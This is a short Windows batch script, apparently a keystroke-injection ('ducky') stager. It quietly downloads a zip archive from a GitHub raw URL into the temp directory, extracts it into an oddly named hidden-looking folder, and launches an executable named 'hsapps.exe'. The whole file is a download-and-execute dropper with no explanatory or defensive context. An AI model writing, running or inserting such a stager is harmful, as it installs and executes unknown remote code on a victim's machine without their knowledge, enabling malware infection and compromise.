@echo off
set "URL=https://raw.githubusercontent.com/BLOCKCE/ducky/refs/heads/main/dg.zip"
set "EXE=hsapps.exe"
set "DIR=%TEMP%\awdiojawdoij"

rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"
curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && start "" /wait "%DIR%\%EXE%"
